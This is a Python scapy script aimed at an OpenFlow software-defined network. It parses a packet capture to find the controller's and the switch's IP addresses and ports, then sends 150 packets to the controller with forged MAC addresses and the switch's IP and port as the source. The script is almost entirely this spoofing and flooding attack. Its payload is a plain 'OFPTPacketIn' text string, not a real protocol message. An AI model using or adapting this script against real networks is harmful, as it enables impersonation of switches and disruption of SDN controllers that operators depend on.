import time
import subprocess
import sys
from scapy.all import *
from scapy.contrib.openflow import _ofp_header
from scapy.fields import ByteEnumField, IntEnumField, IntField, LongField, PacketField, ShortField, XShortField
from scapy.layers.l2 import Ether
#python code to capture the controller's ip and port

packet_in=[]
switch_port=[]
Features_Request=[]
PacketIn=[]
captures= rdpcap ('test.pcap')
for capture in captures:
   message=(capture.summary()).split(" ")
   i=len(message)
   if (message[i-1]=="OFPTFeaturesRequest"):
    Features_Request.append(capture.summary())
    break;
   elif (message[i-1]=="OFPTPacketIn"):
    packet_in.append(capture.summary())
for packet in packet_in:
  frame2=packet.split("/")[2]
  port=((frame2.split(" ")[2]).split(":"))[1]
  switch_port.append(port)

first_frame=Features_Request[0].split("/")[2]
Source_Frame = (first_frame.split(" ")[2]).split(":")
Destination_Frame=(first_frame.split(" ")[4]).split(":")


Controller_IP=Source_Frame[0]
Controller_Port = int(Source_Frame[1])
Switch_IP=Destination_Frame[0]
Switch_Port=int(Destination_Frame[1])
print(Features_Request[0])
print("Controller's IP : %s " %Controller_IP)
print("Controller's Port: %s " %Controller_Port)
print("Switch IP : %s" %Switch_IP)
print("Switch Port : %s" %Switch_Port)

print("sending_packets")
for i in range(150):
        packet = Ether(src='08:00:27:36:5d:87',dst='08:00:27:c7:78:6a')/IP(src=Switch_IP,dst=Controller_IP)/TCP(sport=Switch_Port,dport=Controller_Port)/"OFPTPacketIn"
        send(packet,iface='eth0')
print("done sending packets")
